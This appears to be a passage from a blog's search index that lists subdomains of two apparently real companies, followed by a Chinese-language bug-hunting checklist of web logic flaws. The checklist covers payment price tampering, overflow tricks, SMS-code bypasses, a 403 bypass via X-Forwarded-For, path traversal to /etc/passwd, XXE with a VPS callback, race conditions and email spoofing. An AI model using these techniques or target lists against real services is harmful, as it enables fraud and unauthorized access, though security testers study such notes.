 <p>mail.greatwall.com.cn<br>gwservicetest.greatwall.com.cn<br>dns2.greatwall.com.cn<br>dns1.greatwall.com.cn<br>vpn.greatwall.com.cn<br>greatwall.com.cn<br>kk.greatwall.com.cn<br>vp.greatwall.com.cn<br><a href="http://www.greatwall.com.cn/">www.greatwall.com.cn</a><br>gwsite2.greatwall.com.cn<br>ekp.greatwall.com.cn<br>gwoa01.greatwall.com.cn<br>gwsapdev03.greatwall.com.cn<br>oa.greatwall.com.cn<br>avast.com.greatwall.com.cn</p>
 <p>doc.nrec.com<br>mail.nrec.com<br>vpn.nrec.com<br>web.nrec.com<br><a href="http://www.nrec.com/">www.nrec.com</a><br>qys.nrec.com<br><a href="http://www.nslb.nrec.com/">www.nslb.nrec.com</a><br>smtp.nrec.com<br>app.nrec.com<br>esb.nrec.com<br>oa.nrec.com<br>pop.nrec.com<br>imap.nrec.com<br>svn.nrec.com<br>mis.nrec.com</p>
 <p>​	</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>逻辑漏洞</title>
+    <url>/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[<p>1.修改时间漏洞（修改本地时间，会员问题）</p>
+<p>客户端本地时间校验</p>
+<p>2.xxe漏洞攻击</p>
+<p>工具准备 链接：<a href="https://pan.baidu.com/s/1dTkI2vHmLBwW6c3W4MRWRg?pwd=53z7">https://pan.baidu.com/s/1dTkI2vHmLBwW6c3W4MRWRg?pwd=53z7</a> </p>
+<p>提取码：53z7 </p>
+<p>core.xml文件，上传恶意xslx文件。然后查看vps有没有回连</p>
+<p>3.不安全的资源调用（国企，银行不会存在这类漏洞）</p>
+<p>免费调用接口查信息</p>
+<p>4.自己添加参数，删除参数</p>
+<p>xxx&#x2F;getuid 修改为 xxx&#x2F;getuid&#x3D;1</p>
+<p>5.鉴权，继续拼接参数或者删除参数</p>
+<h2 id="6-支付漏洞"><a href="#6-支付漏洞" class="headerlink" title="6.支付漏洞"></a>6.支付漏洞</h2><p>下单的时候有两个id值，图片和价格，修改一项，用第二个产品的价格购买第一个产品</p>
+<p><strong>7.生成订单的时候修改价格</strong>，</p>
+<p>—-有时候一个订单价格可以由好几个参数决定</p>
+<p>同一个请求包，num:0.01修改价格成功并且成功付款，算一个</p>
+<p>同一个请求包，price:0.01修改价格成功并且成功付款，算一个</p>
+<p>参数不同，就是多个漏洞</p>
+<p><strong>8.付款的时候提示禁止修改价格</strong></p>
+<p>吧第一个成功的返回包替换到第二个</p>
+<p><a href="http://xxxx.com/buysomething/yesbuyid?id=12222">http://xxxx.com/buysomething/yesbuyid?id=12222</a></p>
+<p><strong>25.盲盒或者抽奖</strong></p>
+<p>盲盒是奖励是固定的，抽奖是随机奖励，抓包查看id。或者下单的时候查看。或者查询订单，就是订单未付款但是查询订单结果。</p>
+<p>一个盲盒 你先到达支付页面 然后再回收这个盲盒，再支付(支付邮费)。此时可能商品会待发货而且已经回收的状态</p>
+<p>支付时多次生成订单，然后对每个订单都付款。(多次付款同一个商品)</p>
+<p><strong>27.订单漏洞，</strong></p>
+<p>未付款提前发货，未付款退款问题，修改数量，修改价格，负数，小数，用微信支付，或者余额支付，所有漏洞都要等发货了再交，绕过人工审核这一环节</p>
+<p><strong>47.修改返回的length长度</strong></p>
+<p>论文查重  传文件 长度13000改成1500</p>
+<p>价格从300变成6块</p>
+<p><strong>30.溢出</strong></p>
+<p>-2147483648到2147483647</p>
+<p>2147483648比这个多1元，溢出就付1元了，可能会宕机，如果服务器无法计算</p>
+<p><strong>32.消耗订单数量漏洞</strong></p>
+<h2 id="14-验证码类"><a href="#14-验证码类" class="headerlink" title="14.验证码类"></a>14.验证码类</h2><p>验证码复用</p>
+<p>验证码可以爆破，验证码六位数可以爆破，如果可以复用，才可能存在爆破的可能性</p>
+<p>A手机的验证码B可以用 </p>
+<p>返回包内验证码回显</p>
+<p>验证码双发，phone&#x3D;18888888888&amp;phone&#x3D;15623652651,两个手机号获得同样的验证码</p>
+<p>验证码通用000000</p>
+<p>验证码转发 逗号接上下一个手机号，</p>
+<p>已知邮箱验证链接，观察跳转连接的url，token  </p>
+<p>修改返回包内容验证码绕过500改成200，false改成true</p>
+<p>短信轰炸有限制，<strong>可以删除cookie</strong>,尝试绕过手机号码前后加空格，86,086，0086</p>
+<p>&#x2F;r，&#x2F;n，以及特殊符号等修改cookie，变量，</p>
+<p>返回138888888889 12位经过短信网关取前11位，导致短信轰炸进行能解析的编码</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>9.学号改工号</p>
+<p>{“xh”:10000001}改为{“gh”:”sysadmin”} 返回包修改类型或者usertype:”2”改成1</p>
+<p>10.腾讯地图apikey泄露——低危</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;https://map.qg.com/api/gljs?v=1.exp&amp;key=ZBBZ-*********-N563Z-ISDSD5&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>11,。微信session_key泄露</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage.png"></p>
+<p><a href="https://mp.weixin.qq.com/s/t-PCV7pAs448wf3pKIZmgg">https://mp.weixin.qq.com/s/t-PCV7pAs448wf3pKIZmgg</a></p>
+<p>12.没登录的情况下，翻js，未授权等漏洞</p>
+<p>在登录的情况下翻js （有些js是动态加载的，翻管理员功能接口</p>
+<p>13.一闪而过的允许点击（三个功能点）</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230730203447700.png" alt="image-20230730203447700"></p>
+<p>点击选项三  url是   xxxx&#x2F;type&#x3D;3   修改成2</p>
+<p>15.<html><script>alert('XSS is easy');</script><html> png 图片会弹框</p>
+<p>16.host主机钓鱼 邮件发送 多添加一条hostreferer</p>
+<p><a href="https://blog.csdn.net/angry_program/article/details/109034421">https://blog.csdn.net/angry_program/article/details/109034421</a></p>
+<p>17.email&#x3D;<a href="mailto:&#49;&#50;&#x33;&#64;&#101;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;">&#49;&#50;&#x33;&#64;&#101;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;</a>&amp;email&#x3D;<a href="mailto:&#49;&#50;&#x33;&#x40;&#x65;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#49;&#50;&#x33;&#x40;&#x65;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a></p>
+<p>email&#x3D;<a href="mailto:&#x31;&#50;&#x33;&#x40;&#x65;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#x31;&#50;&#x33;&#x40;&#x65;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;</a> %20email&#x3D;<a href="mailto:&#49;&#50;&#x33;&#x40;&#x65;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#109;">&#49;&#50;&#x33;&#x40;&#x65;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#109;</a></p>
+<p>email&#x3D;<a href="mailto:&#49;&#x32;&#51;&#x40;&#x65;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#49;&#x32;&#51;&#x40;&#x65;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a> | email&#x3D;<a href="mailto:&#x31;&#50;&#x33;&#64;&#101;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#x31;&#50;&#x33;&#64;&#101;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
+<p>%0a%0 ,  </p>
+<p>18.订单功能取消，true改成false钱退回来，订单还是成功的状态</p>
+<p>19.删除用户提示没有权限，将host改成localhost  绕403  x-forward-for:127.0.0.1</p>
+<p>插件fakeip</p>
+<p>20.领取新人礼包，然后换绑账号（注销继续领取）尝试继续领取</p>
+<p>21.领一次的东西   并发</p>
+<p>22并发导致越权，过waf  &lt; &gt; 拦截  大量发包        服务器反应不过来</p>
+<p>23.数字型溢出  0.1不行    一直加0</p>
+<p>24.签约漏洞</p>
+<p>升级会员普通会员10元，升级为超级会员在加5块，两个客户端同时登陆付款</p>
+<p>26.推广漏洞，新人无限刷，用户注销重新推广</p>
+<p>29.并发</p>
+<p>5块钱余额，提现两次或以上并发更容易成功</p>
+<p>所有只能一次的地方都要想着并发</p>
+<p>31.pdfxss  xss无任何作用只能弹窗</p>
+<p>33.spf邮件欺骗</p>
+<p>spf是一个记录邮件服务器的服务   25端口</p>
+<p><a href="https://www.kitterman.com/spf/validate.html">https://www.kitterman.com/spf/validate.html</a> 利用网站     </p>
+<p>34.cookie可逆</p>
+<p>jwt  cookie 存在一段一段重复性的字母</p>
+<p>35.六位数密码可爆破</p>
+<p>36.黑产如何挖掘  卖信息</p>
+<p>37.url拼接</p>
+<p>上传一个文件   xxx.com&#x2F;file&#x2F;xx.jpg</p>
+<p>xxx.com&#x2F;file&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
+<p>38.文件可遍历，文件名为规律递增</p>
+<p><a href="http://xxxxx.com/file/156316.jpg">http://xxxxx.com/file/156316.jpg</a></p>
+<p>39.一个网站注册可以多种职务，学生老师管理员，</p>
+<p>40.编辑器问题，，xss csrf,文件上传</p>
+<p>41.一个漏洞变两个</p>
+<p>重复挖掘是一方面，网站对应的小程序，网站对应的app，同域名的子域名的漏洞</p>
+<p>42.跨域漏洞  cors  jsonp</p>
+<p>43.注册的时候抓包，替换掉admin</p>
+<p>44.覆盖admin,修改用户名的时候也可以，修改之后无法登陆，遍历，全站用户无法登陆</p>
+<p>45.浏览器本地缓存修改，举例</p>
+<p>46.小程序，appid和appsecret泄露，返回包泄露，使用官方接口利用</p>
+<p>通过这两个参数可以找到小程序的access token</p>
 ]]></content>
   </entry>
 </search>
